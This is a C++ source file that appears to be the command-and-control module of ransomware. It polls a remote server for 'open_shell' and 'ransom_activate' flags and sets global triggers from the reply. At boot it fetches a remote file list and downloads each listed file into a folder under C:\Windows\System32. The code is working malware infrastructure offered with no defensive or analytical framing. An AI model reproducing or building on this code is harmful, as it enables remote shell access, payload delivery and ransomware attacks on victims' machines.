#include "../../libs/libcurl/headers/curl.h"
#include <filesystem>
#include <fstream>
#include <iostream>
#include <sstream>
#include <string>
#include <vector>
#include <thread>
#include "../include/json.hpp"

#include "../include/shared.h"



using namespace std;
using json = nlohmann::json;
namespace fs = std::filesystem;


size_t writeCallback(void* ptr, size_t size, size_t nmemb, std::string* data) {
    data->append((char*)ptr, size * nmemb);
    return size * nmemb;
}


void requestEndpoint(const char* url, int sleepTime) {
    CURL* curl;
    CURLcode res;
    std::string readBuffer;

    while (!g_stopFlag.load()) {
        curl = curl_easy_init();
        if (curl) {
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
            }
            else {
                try {
                    json responseJson = json::parse(readBuffer);

                    if (responseJson.contains("open_shell") && responseJson["open_shell"].is_boolean()) {
                        g_openShell.store(responseJson["open_shell"]);
                        std::cout << "openShell flag set to: " << responseJson["open_shell"] << std::endl;
                    }
                    if (responseJson.contains("ransom_activate") && responseJson["ransom_activate"].is_boolean()) {
                        g_activateRansom.store(responseJson["ransom_activate"]);
                        std::cout << "ransom_activate flag set to: " << responseJson["ransom_activate"] << std::endl;
                        std::cout << g_activateRansom << std::endl;
                    }

                }
                catch (const nlohmann::json::exception& e) {
                    std::cerr << "JSON parsing error: " << e.what() << std::endl;
                }
            }

            curl_easy_cleanup(curl);
            readBuffer.clear();
        }

        std::this_thread::sleep_for(std::chrono::seconds(sleepTime));
    }
}

std::vector<std::string> fetchFileList(const std::string& url) {
    CURL* curl;
    CURLcode res;
    std::string readBuffer;
    std::vector<std::string> fileList;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
        }
        else {
            std::istringstream iss(readBuffer);
            std::string filename;
            while (std::getline(iss, filename)) {
                fileList.push_back(filename);
            }
        }

        curl_easy_cleanup(curl);
    }
    return fileList;
}

void downloadFile(const std::string& url, const std::string& filePath) {
    CURL* curl;
    CURLcode res;
    FILE* file;

    curl = curl_easy_init();
    if (curl) {
        file = fopen(filePath.c_str(), "wb");
        if (file) {
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, file);

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
            }

            fclose(file);
        }
        else {
            std::cerr << "Could not open file for writing: " << filePath << std::endl;
        }

        curl_easy_cleanup(curl);
    }
}

void fetchAndDownloadFilesAtBoot(const std::string& fileListUrl, const std::string& fileBaseUrl) {
    std::vector<std::string> fileList = fetchFileList(fileListUrl);
    for (std::vector<std::string>::iterator it = fileList.begin(); it != fileList.end(); ++it) {
        std::string filename = *it;
        std::string filePath = "C:\\Windows\\System32\\test\\" + filename;
        if (!fs::exists(filePath)) {
            std::string fileUrl = fileBaseUrl + filename;
            downloadFile(fileUrl, filePath);
        }
    }
}

